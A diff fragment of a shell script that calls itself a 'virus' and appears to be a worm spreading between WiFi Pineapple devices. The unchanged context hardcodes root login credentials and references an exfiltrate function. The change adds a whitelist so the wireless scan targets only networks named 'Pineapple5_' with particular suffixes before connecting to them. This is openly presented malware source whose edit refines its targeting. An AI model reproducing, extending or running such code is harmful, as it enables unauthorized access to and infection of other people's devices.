@@ -7,6 +7,7 @@
 #n00b comments provided by:
 #   ActualReverend
 
+WHITELIST="0DDA|120D"
 
 #Setup some constants, note: token must be the sha1 of sessid, do not rely on openssl being available on the remote device
 creds="username=root&password=pineapplesareyummy&login="
@@ -196,7 +197,7 @@ exfiltrate() {
 #Run the virus...
 init
 echo "Scanning for new devices..."
-for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
+for net in `iwlist wlan0 scan | egrep "ESSID:\"Pineapple5_($WHITELIST)[^ ]" | grep -v "$self"`
 do
 	pushstate
 	connect `echo $net | cut -d '"' -f 2`
